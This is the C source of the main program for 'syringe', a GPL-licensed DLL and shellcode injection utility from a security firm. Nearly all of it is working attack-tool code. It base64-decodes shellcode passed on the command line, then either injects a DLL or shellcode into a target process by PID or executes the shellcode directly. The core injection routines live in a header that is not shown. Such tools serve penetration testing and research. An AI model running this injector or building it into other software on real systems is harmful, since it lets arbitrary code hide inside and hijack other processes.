/*
 *
 *      syringe.c v1.5
 *
 *      Author: Spencer McIntyre (Steiner) <smcintyre [at] securestate [dot] com>
 *
 *      A General Purpose DLL & Code Injection Utility
 *
 *      Copyright 2011-2015 SecureState
 *
 *      This program is free software; you can redistribute it and/or modify
 *      it under the terms of the GNU General Public License as published by
 *      the Free Software Foundation; either version 2 of the License, or
 *      (at your option) any later version.
 *
 *      This program is distributed in the hope that it will be useful,
 *      but WITHOUT ANY WARRANTY; without even the implied warranty of
 *      MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *      GNU General Public License for more details.
 *
 *      You should have received a copy of the GNU General Public License
 *      along with this program; if not, write to the Free Software
 *      Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 *      MA 02110-1301, USA.
 *
 */

#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <WinCrypt.h>

#include "syringe_core.h"

#define MAXLINE 512
#define ATTACK_TYPE_DLL_INJECTION 1
#define ATTACK_TYPE_SHELL_CODE_INJECTION 2
#define ATTACK_TYPE_EXECUTE_SHELL_CODE 3
#ifdef _M_X64
#define APPLICATION_NAME "Syringe v1.5 x64"
#else
#define APPLICATION_NAME "Syringe v1.5 x86"
#endif
#define USAGE_STRING	"A General Purpose DLL & Code Injection Utility\n"\
						"\n"\
						"Usage:\n"\
						"  Inject DLL:\n"\
						"    syringe.exe -1 [ dll ] [ pid ]\n"\
						"\n"\
						"  Inject Shellcode:\n"\
						"    syringe.exe -2 [ shellcode ] [ pid ]\n"\
						"\n"\
						"  Execute Shellcode:\n"\
						"    syringe.exe -3 [ shellcode ]\n"

int main(int argc, char* argv[]) {
	CHAR pDllPath[MAXLINE] = "";
	DWORD dwPid = 0;
	DWORD dwResult = 0;
	DWORD dwAttackType = 0;
	DWORD dwNumArgs = 4;
	PBYTE pShellcode = NULL;
	DWORD dwShellcodeLength = 0;

	printf("%s\n", APPLICATION_NAME);
	if (argc < 2) {
		printf(USAGE_STRING);
		return 0;
	}

	if (strncmp(argv[1], "-1", 2) == 0) {
		dwAttackType = ATTACK_TYPE_DLL_INJECTION;
	} else if (strncmp(argv[1], "-2", 2) == 0) {
		dwAttackType = ATTACK_TYPE_SHELL_CODE_INJECTION;
	} else if (strncmp(argv[1], "-3", 2) == 0) {
		dwAttackType = ATTACK_TYPE_EXECUTE_SHELL_CODE;
		dwNumArgs = 3;
	} else {
		printf(USAGE_STRING);
		return 0;
	}
	if (argc != dwNumArgs) {
		printf(USAGE_STRING);
		return 0;
	}

	if ((dwAttackType == ATTACK_TYPE_SHELL_CODE_INJECTION) || (dwAttackType == ATTACK_TYPE_EXECUTE_SHELL_CODE)) {
		if (!CryptStringToBinaryA(argv[2], 0, CRYPT_STRING_BASE64, pShellcode, &dwShellcodeLength, 0, NULL)) {
			printf("Failed to decode the provided shellcode\n");
			return 0;
		}
		pShellcode = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwShellcodeLength);
		if (pShellcode == NULL) {
			printf("Failed to allocate space for the shellcode\n");
			return 0;
		}
		if (!CryptStringToBinaryA(argv[2], 0, CRYPT_STRING_BASE64, pShellcode, &dwShellcodeLength, 0, NULL)) {
			printf("Failed to decode the provided shellcode\n");
			return 0;
		}
	}

	if ((dwAttackType == ATTACK_TYPE_DLL_INJECTION) || (dwAttackType == ATTACK_TYPE_SHELL_CODE_INJECTION)) {
		dwPid = atoi(argv[3]);
		if (!dwPid) {
			printf("Invalid Process ID.\n");
			return 0;
		}
		if (dwAttackType == ATTACK_TYPE_DLL_INJECTION) {
			GetFullPathNameA(argv[2], MAXLINE, pDllPath, NULL);
			dwResult = InjectDLL(pDllPath, dwPid);
		} else if (dwAttackType == ATTACK_TYPE_SHELL_CODE_INJECTION) {
			dwResult = InjectShellcode(pShellcode, (SIZE_T)dwShellcodeLength, dwPid);
		}

		if (dwResult == 0) {
			printf("Successfully Injected.\n");
		} else {
			printf("Failed To Inject.\nError: ");
			switch (dwResult) {
				case 1: { printf("Invalid Process ID\n"); break; }
				case 2: { printf("Could Not Open A Handle To The Process\n"); break; }
				case 3: { printf("Could Not Get The Address Of LoadLibraryA\n"); break; }
				case 4: { printf("Could Not Allocate Memory In Remote Process\n"); break; }
				case 5: { printf("Could Not Write To Remote Process\n"); break; }
				case 6: { printf("Could Not Start The Remote Thread\n"); break; }
			}
		}
	} else if (dwAttackType == ATTACK_TYPE_EXECUTE_SHELL_CODE) {
		ExecuteShellcode(pShellcode, (SIZE_T)dwShellcodeLength, FALSE);
	}

	if (pShellcode) {
		HeapFree(GetProcessHeap(), 0, pShellcode);
	}
	return 0;
}
